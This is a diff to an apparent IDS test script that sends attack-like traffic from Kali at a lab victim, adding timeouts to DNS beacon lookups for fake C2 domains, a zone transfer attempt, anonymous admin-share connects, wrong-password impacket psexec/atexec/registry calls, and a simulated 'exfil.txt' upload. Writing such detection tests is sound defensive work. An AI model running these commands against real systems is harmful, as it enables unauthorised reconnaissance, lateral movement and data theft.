@@ -211,8 +211,8 @@ dig @1.1.1.1 "$(date +%s).malware.tk" +short 2>/dev/null || true
 dig @1.1.1.1 "cmd.c2.xyz" +short 2>/dev/null || true
 dig @1.1.1.1 "beacon.darkside.onion" +short 2>/dev/null || true
 
-# Zone transfer attempt
-dig @${VICTIM_IP} example.com AXFR 2>/dev/null || true
+# Zone transfer attempt (victim has no DNS — timeout 10 to prevent 45s dig retry loop)
+timeout 10 dig @${VICTIM_IP} example.com AXFR 2>/dev/null || true
 
 # ---------- Credential Attacks ----------
 
@@ -955,24 +955,26 @@ echo "[31] Lateral movement primitives — SMB tree connects + named pipes"
 
 # Tree connect attempts to admin shares (will be denied by samba but
 # the SMB protocol exchange happens and our rules see the share name).
-smbclient -N "//${VICTIM_IP}/ADMIN\$" -c 'ls' 2>/dev/null || true
-smbclient -N "//${VICTIM_IP}/C\$" -c 'ls' 2>/dev/null || true
-smbclient -N "//${VICTIM_IP}/IPC\$" -c 'help' 2>/dev/null || true
+# timeout 10 on each — victim may have no SMB listener, and a firewalled
+# 445 black-holes SYN rather than RST, which would hang smbclient for ~75s.
+timeout 10 smbclient -N "//${VICTIM_IP}/ADMIN\$" -c 'ls' 2>/dev/null || true
+timeout 10 smbclient -N "//${VICTIM_IP}/C\$" -c 'ls' 2>/dev/null || true
+timeout 10 smbclient -N "//${VICTIM_IP}/IPC\$" -c 'help' 2>/dev/null || true
 
 # Named-pipe + DCERPC exchanges via impacket (preinstalled on Kali)
 # These will fail auth but exercise the SMB/DCERPC pipeline enough
 # to populate smb.named_pipe / dcerpc.iface buffers.
-impacket-psexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
-impacket-services "administrator:wrongpass@${VICTIM_IP}" list 2>/dev/null || true
-impacket-reg "administrator:wrongpass@${VICTIM_IP}" query -keyName HKLM\\SYSTEM 2>/dev/null || true
-impacket-samrdump "administrator:wrongpass@${VICTIM_IP}" 2>/dev/null || true
-impacket-atexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
+timeout 10 impacket-psexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
+timeout 10 impacket-services "administrator:wrongpass@${VICTIM_IP}" list 2>/dev/null || true
+timeout 10 impacket-reg "administrator:wrongpass@${VICTIM_IP}" query -keyName HKLM\\SYSTEM 2>/dev/null || true
+timeout 10 impacket-samrdump "administrator:wrongpass@${VICTIM_IP}" 2>/dev/null || true
+timeout 10 impacket-atexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
 
 # Also try against the misconfigured guest-writable lab share so impacket
 # actually proceeds past session setup and reaches the juicy named-pipe
 # / DCERPC exchanges our rules look for.
-smbclient "//${VICTIM_IP}/lab" -N -c 'ls; put /etc/hostname exfil.txt' 2>/dev/null || true
-impacket-lookupsid "guest:@${VICTIM_IP}" 2>/dev/null || true
+timeout 10 smbclient "//${VICTIM_IP}/lab" -N -c 'ls; put /etc/hostname exfil.txt' 2>/dev/null || true
+timeout 10 impacket-lookupsid "guest:@${VICTIM_IP}" 2>/dev/null || true
 
 # ---------- JA3 fingerprint triggers (Iteration 5) ----------
 echo "[32] JA3 TLS fingerprint probes"
